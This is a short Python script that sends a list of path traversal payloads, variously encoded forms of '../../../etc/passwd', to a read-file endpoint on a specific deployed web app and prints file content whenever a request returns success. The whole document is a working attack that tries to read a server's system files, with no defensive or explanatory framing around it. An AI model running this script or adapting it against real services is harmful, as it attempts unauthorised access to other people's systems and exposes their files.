import requests

payloads = [
    '../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '....//....//....//etc/passwd',
    '..;/..;/..;/etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
]

for payload in payloads:
    url = f'https://quiz-builder-ocr.vercel.app/api/read-file?file={payload}'
    r = requests.get(url)
    print(f'{payload}: Status {r.status_code}')
    if r.status_code == 200:
        print(f'  SUCCESS! Content: {r.text[:100]}')
